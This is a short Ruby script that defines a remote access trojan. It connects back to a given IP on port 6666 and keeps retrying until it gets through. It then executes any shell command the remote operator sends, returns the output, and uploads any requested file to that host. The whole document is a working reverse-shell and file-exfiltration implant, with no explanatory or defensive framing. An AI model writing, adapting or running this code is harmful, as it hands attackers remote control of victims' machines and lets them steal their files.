#!/usr/bin/ruby
require 'socket'

def rat(ip)
  begin
    socket = TCPSocket.new(ip, 6666)
    loop do
      command, file = socket.gets.chomp.split(' ')
      case command
      when 'session'
        loop do
          cmd = socket.gets.chomp
          if cmd == 'exit'
            break
          end
          begin
            socket.puts `#{cmd}`
          rescue Errno::ENOENT
            socket.puts 'invalid command'
          end
          socket.puts 'done'
        end
      when 'download'
        file = File.open(file, 'r')
        content = file.read
        puts content
        socket.puts content
        file.close
        socket.puts 'done'
      end
    end

  rescue SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
    sleep 2
    retry
  rescue Interrupt
    socket.close
  end

end